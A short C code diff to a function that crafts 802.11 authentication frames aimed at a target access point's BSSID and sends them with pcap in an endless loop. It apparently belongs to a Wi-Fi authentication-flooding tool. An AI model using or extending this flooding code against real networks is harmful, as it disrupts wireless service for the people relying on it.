@@ -180,13 +180,12 @@ void sendAuth(args* argv) {
   memcpy(beacon->frame.bssid, argv->ap, 6);
   beacon->frame.seq_frag = 0x0000;
   beacon->fixed_auth.auth_algorithm = 0x0000;
-  beacon->fixed_auth.auth_seq = 0x0000;
+  beacon->fixed_auth.auth_seq = 0x0002;
   beacon->fixed_auth.status_code = 0x0000;
   int size = sizeof(_80211_auth);
   
   while(1) {
     pcap_sendpacket(handle, beacon, size);
-    beacon->fixed_auth.auth_seq++;
   }
   pcap_close(handle);
 }
